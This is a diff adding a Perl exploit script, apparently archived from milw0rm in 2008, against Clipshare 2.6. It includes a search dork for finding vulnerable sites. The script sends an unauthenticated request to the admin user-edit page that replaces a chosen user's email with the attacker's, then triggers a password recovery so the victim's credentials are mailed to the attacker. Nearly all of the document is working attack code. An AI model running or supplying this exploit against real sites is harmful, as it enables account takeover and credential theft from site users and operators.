@@ -1,0 +1,48 @@
+#!/usr/bin/perl -w
+#priv8
+#Pr0metheuS
+#Exploit Name: Clipshare Remote User Password Change Exploit
+#Version Script: Clipshare 2.6
+#Dork: "Powered by Clipshare"
+#EnjoY
+print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
+print "\nClipshare 2.6 Remote User Passord Change Exploit\n";
+print "\nBy Pr0metheuS \n";
+print "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\n";
+print "Site Address:\n";
+$SITE = <STDIN>;
+chomp $SITE;
+print "Path to Site:\n";
+$PATH = <STDIN>;
+chomp $PATH;
+print "ID user:\n";
+$ID = <STDIN>;
+chomp $ID;
+print "Your Email(to send user password):\n";
+$EM = <STDIN>;
+chomp $EM;
+use LWP::UserAgent;
+$ua = new LWP::UserAgent;
+$ua->agent("Mozilla/8.0");
+$ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(POST => "$SITE$PATH/siteadmin/useredit.php?action=edit&uid=$ID");
+$req->content_type('application/x-www-form-urlencoded');
+$req->content("email=$EM&fname=&lname=&city=&country=United+States&website=&occupation=&company=&school=&interest_hobby=&fav_movie_show=&fav_book=&fav_music=&aboutme=&emailverified=no&account_status=Active&submit=Update");
+$res = $ua->request($req);
+if (($res->content =~ /$EM/)) {
+print "Update!\n";
+use LWP::UserAgent;
+$ua2 = new LWP::UserAgent;
+$ua2->agent("Mozilla/8.0");
+$ua2 = LWP::UserAgent->new;
+my $req2 = HTTP::Request->new(POST => "$SITE$PATH/recoverpass.php");
+$req2->content_type('application/x-www-form-urlencoded');
+$req2->content("email=$EM&recover=Submit");
+$res = $ua2->request($req2);
+print "Check your Email!\n";
+}
+else{
+print "Wrong ID or path!";
+}
+
+# milw0rm.com [2008-01-05]
